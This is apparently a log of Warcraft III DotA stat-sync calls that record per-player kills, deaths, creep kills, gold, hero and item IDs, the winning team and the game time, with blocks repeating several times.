	SendSyncDat("dr.x", "Data", "NK1", 8);
	SendSyncDat("dr.x", "Data", "CSK7", 151);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 36);
	SendSyncDat("dr.x", "Data", "CSK2", 96);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 24);
	SendSyncDat("dr.x", "Data", "CSK8", 88);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 65);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 3);
	SendSyncDat("dr.x", "Data", "CSK9", 77);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 16);
	SendSyncDat("dr.x", "Data", "CSK4", 15);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 37);
	SendSyncDat("dr.x", "Data", "CSK10", 34);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 55);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 4);
	SendSyncDat("dr.x", "Data", "CSK11", 67);
	SendSyncDat("dr.x", "Data", "CSD11", 5);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse5", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "Hero3", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "Hero1", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "Level17", 8);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Hero5", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 5);
	SendSyncDat("dr.x", "Data", "Assist9", 5);
	SendSyncDat("dr.x", "Data", "Assist10", 5);
	SendSyncDat("dr.x", "Data", "Assist11", 5);
	SendSyncDat("dr.x", "Data", "Level21", 7);
	SendSyncDat("dr.x", "Data", "Level14", 9);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
